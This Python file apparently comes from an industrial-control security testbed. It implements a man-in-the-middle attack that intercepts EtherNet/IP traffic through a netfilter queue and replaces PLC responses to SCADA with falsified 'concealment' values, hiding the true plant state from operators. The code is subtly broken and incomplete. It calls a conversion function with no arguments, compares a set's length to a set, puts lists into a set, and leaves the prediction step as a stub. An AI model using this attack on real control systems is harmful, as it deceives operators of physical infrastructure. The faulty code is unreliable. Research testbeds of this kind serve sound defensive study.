from dhalsim.network_attacks.mitm_netfilter_queue_subprocess import PacketQueue
import argparse
from pathlib import Path

import os
import sys

import pandas as pd

from scapy.layers.inet import IP, TCP
from scapy.packet import Raw

from dhalsim.network_attacks.utilities import translate_payload_to_float, translate_float_to_payload

class Error(Exception):
    """Base class for exceptions in this module."""

class ConcealmentError(Error):
    """Raised when there is an error in the concealment parameter"""

class UnconstrainedBlackBoxMiTMNetfilterQueue(PacketQueue):

    def __init__(self,  intermediate_yaml_path: Path, yaml_index: int, queue_number: int ):
        super().__init__(intermediate_yaml_path, yaml_index, queue_number)

        # set with all the tags received by SCADA
        self.scada_tags = self.get_scada_tags()

        # Initialize input values
        self.received_scada_tags_df = self.set_initial_conditions_of_scada_values()

        # We can use the same method, as initially the df will be initialized with 0 values
        self.calculated_concealment_values_df = self.set_initial_conditions_of_scada_values()

        # set with the tags we have not received in this iteration
        self.missing_scada_tags = self.scada_tags
        self.complete_scada_set = False
        self.received_window_size = 0

        #todo: Generalize for different window sizes
        self.window_size = 1

        self.scada_values = []
        self.scada_session_ids = []
        self.initialized = False

        # This flaf ensures that the prediction is called only once per iteration
        self.predicted_for_iteration = False

    #todo: Generalize this for different window sizes
    def set_initial_conditions_of_scada_values(self):
        zero_Values = [0] * len(self.scada_tags)
        df = pd.DataFrame(columns=self.scada_tags, data=[zero_Values])
        return df


    def get_scada_tags(self):
        aux_scada_tags = []
        for PLC in self.intermediate_yaml['plcs']:
            if 'sensors' in PLC:
                aux_scada_tags.append(PLC['sensors'])
            if 'actuators' in PLC:
                aux_scada_tags.append(PLC['actuators'])

        return set(aux_scada_tags)

    def predict_concealment_values(self):
        self.logger.debug('predicting')

    def handle_concealment(self, session, ip_payload):

        if len(self.missing_scada_tags) == self.scada_tags:
            # We miss all the tags. Start of a new prediction cycle
            self.predicted_for_iteration = False

        for tag in self.scada_tags:
            if session['tag'] == tag:
                if tag in self.missing_scada_tags:

                    # We store the value, this df is an input for the concealment ML model
                    self.received_scada_tags_df[tag] = translate_payload_to_float()
                    self.missing_scada_tags.remove(tag)

                    # Missing set is empty, increase the window count
                    if not self.missing_scada_tags:
                        self.missing_scada_tags = self.scada_tags

                        if not self.initialized:
                            self.received_window_size = self.received_window_size + 1
                            if self.received_window_size >= self.window_size:
                                self.initialized = True

                        elif not self.predicted_for_iteration:
                            self.predicted_for_iteration = True
                            self.predict_concealment_values()


                # If model is initialized, we have to conceal, regardless of missing set
                if self.initialized:
                    modified = True
                    return translate_float_to_payload(self.calculated_concealment_values_df[tag],
                                                      ip_payload[Raw].load), modified
                else:
                    modified = False
                    # We don't conceal before initialization
                    return ip_payload[Raw].load, modified

    def handle_enip_response(self, ip_payload):
        this_session = int.from_bytes(ip_payload[Raw].load[4:8], sys.byteorder)
        this_context = int.from_bytes(ip_payload[Raw].load[12:20], sys.byteorder)

        self.logger.debug('ENIP response session: ' + str(this_session))
        self.logger.debug('ENIP response context: ' + str(this_context))

        # Concealment values to SCADA
        for session in self.scada_session_ids:
            if session['session'] == this_session and session['context'] == this_context:
                self.logger.debug('Concealing to SCADA: ' + str(this_session))
                return self.handle_concealment(session, ip_payload)

        modified = False
        return ip_payload, modified

    def handle_enip_request(self, ip_payload, offset):

        # For this concealment, the only valid target is SCADA
        if ip_payload[IP].src == self.intermediate_yaml['scada']['public_ip']:
            this_session = int.from_bytes(ip_payload[Raw].load[4:8], sys.byteorder)
            tag_name = ip_payload[Raw].load.decode(encoding='latin-1')[54:offset]
            context = int.from_bytes(ip_payload[Raw].load[12:20], sys.byteorder)

            self.logger.debug('this tag is: ' + str(tag_name))
            session_dict = {'session': this_session, 'tag': tag_name, 'context': context}
            self.logger.debug('session dict: ' + str(session_dict))

            self.logger.debug('SCADA Req session')
            self.scada_session_ids.append(session_dict)

    def capture(self, packet):
        """
        This function is the function that will run in the thread started in the setup function.

        For every packet that enters the netfilterqueue, it will check its length. If the length is
        in between 102, we are dealing with a CIP packet. We then change the payload of that
        packet and delete the original checksum.
        :param packet: The captured packet.
        """

        try:
            p = IP(packet.get_payload())
            if 'TCP' in p:
                if len(p) == 102:
                    p[Raw].load, modified = self.handle_enip_response(p)
                    if modified:
                        del p[IP].chksum
                        del p[TCP].chksum
                        packet.set_payload(bytes(p))
                    packet.accept()
                    return

                else:
                    if len(p) == 118:
                        self.logger.debug('handling request 57')
                        self.handle_enip_request(p, 57)
                        self.logger.debug('handled request')
                    elif len(p) == 116:
                        self.logger.debug('handling request 56')
                        self.handle_enip_request(p, 56)
                        self.logger.debug('handled request')
                    else:
                        packet.accept()
                        return

            packet.accept()

        except Exception as exc:
            print(exc)
            if self.nfqueue:
                self.nfqueue.unbind()
            sys.exit(0)

def is_valid_file(parser_instance, arg):
    """Verifies whether the intermediate yaml path is valid."""
    if not os.path.exists(arg):
        parser_instance.error(arg + " does not exist")
    else:
        return arg

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Start everything for an attack')
    parser.add_argument(dest="intermediate_yaml",
                        help="intermediate yaml file", metavar="FILE",
                        type=lambda x: is_valid_file(parser, x))
    parser.add_argument(dest="index", help="Index of the network attack in intermediate yaml",
                        type=int,
                        metavar="N")
    parser.add_argument(dest="number", help="Number of que queue configured in IP Tables",
                        type=int,
                        metavar="N")

    args = parser.parse_args()

    attack = UnconstrainedBlackBoxMiTMNetfilterQueue(
        intermediate_yaml_path=Path(args.intermediate_yaml),
        yaml_index=args.index,
        queue_number = args.number)
    attack.main_loop()

